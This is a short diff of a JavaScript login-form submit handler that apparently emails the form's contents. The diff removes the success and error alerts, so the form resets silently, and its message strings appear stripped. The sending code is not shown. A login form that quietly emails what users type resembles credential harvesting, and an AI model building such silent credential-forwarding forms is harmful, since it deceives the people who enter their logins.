@@ -49,13 +49,12 @@ loginForm.addEventListener('submit', async function(e) {
     );
 
     console.log(':', emailResponse);
-    alert(' ');
+    
 
     loginForm.reset();
 
   } catch (error) {
     console.error('Error sending email:', error);
-    alert('.');
   } finally {
     submitButton.textContent = originalText;
     submitButton.disabled = false;
